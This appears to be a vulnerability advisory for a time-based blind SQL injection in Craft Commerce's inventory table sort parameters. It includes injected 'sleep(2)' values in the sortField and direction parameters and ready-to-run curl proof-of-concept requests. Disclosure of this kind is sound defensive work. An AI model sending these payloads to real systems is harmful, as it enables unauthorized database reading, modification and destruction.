summary: "Craft Commerce is vulnerable to SQL Injection in Commerce Inventory Table Sorting\n\
  ## Summary\n\nCraft Commerce is vulnerable to **SQL Injection** in the inventory levels table\
  \ data endpoint. The `sort[0][direction]` and `sort[0][sortField]` parameters are concatenated\
  \ directly into an `addOrderBy()` clause without any validation or sanitization. An authenticated\
  \ attacker with access to the Commerce Inventory section can inject arbitrary SQL queries,\
  \ potentially leading to a full database compromise.\n\n---\n## PoC\n### Required Permissions\n\
  - General\n\t- Access the control panel\n\t- Access Craft Commerce\n- Craft Commerce\n\t-\
  \ Manage inventory stock levels \n\n### Steps to reproduce\n1. Log in to the control panel\n\
  2. Navigate to **Commerce** > **Inventory**\n3. Click on any sortable column header (e.g.,\
  \ \"SKU\") to trigger a sort request\n4. Intercept the request and modify `sort[0][direction]`\
  \ or `sort[0][sortField]` parameters and append `,sleep(2)` payload to it's current value\
  \ as follows:\n\n```bash\n# sort[0][sortField]=sku,sleep(2)\nGET /index.php?p=admin/actions/commerce/inventory/inventory-levels-table-data&sort[0][sortField]=sku,sleep(2)&sort[0][direction]=asc&inventoryLocationId=1&containerId=%23inventory-levels\n\
  # sort[0][direction]=asc,sleep(2)\nGET /index.php?p=admin/actions/commerce/inventory/inventory-levels-table-data&sort[0][sortField]=sku&sort[0][direction]=asc,sleep(2)&inventoryLocationId=1&containerId=%23inventory-levels\n\
  ```\n\n6. Observe the delay in the response, confirming the injection\n\nAlternatively, you\
  \ can use the following `curl` (bash syntax) command (replace cookie and target domain as\
  \ needed):\n```bash\n# sort[0][sortField]=sku,sleep(2)\ncurl --path-as-is -k -H $'User-Agent:\
  \ Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:146.0) Gecko/20100101 Firefox/146.0' -H $'Accept:\
  \ application/json, text/plain, */*' -b $'<Cookie>' $'http://craft.local/index.php?p=admin/actions/commerce/inventory/inventory-levels-table-data&sort%5b0%5d%5bfield%5d=purchasable&sort%5b0%5d%5bsortField%5d=sku,sleep(2)&sort%5b0%5d%5bdirection%5d=asc&page=1&per_page=25&inventoryLocationId=1&containerId=%23inventory-levels'\n\
  # sort[0][direction]=asc,sleep(2)\ncurl --path-as-is -k -H $'User-Agent: Mozilla/5.0 (Windows\
  \ NT 10.0; Win64; x64; rv:146.0) Gecko/20100101 Firefox/146.0' -H $'Accept: application/json,\
  \ text/plain, */*' -b $'<Cookie>' $'http://craft.local/index.php?p=admin/actions/commerce/inventory/inventory-levels-table-data&sort%5b0%5d%5bfield%5d=purchasable&sort%5b0%5d%5bsortField%5d=sku&sort%5b0%5d%5bdirection%5d=asc,sleep(2)&page=1&per_page=25&inventoryLocationId=1&containerId=%23inventory-levels'\n\
  ```\n\n### Impact\nWith this Blind SQLi, an attacker can:\n- **Exfiltrate data** character-by-character\
  \ using time-based techniques.\n- **Modify or destroy data** (drop tables, update records,\
  \ alter schema)."
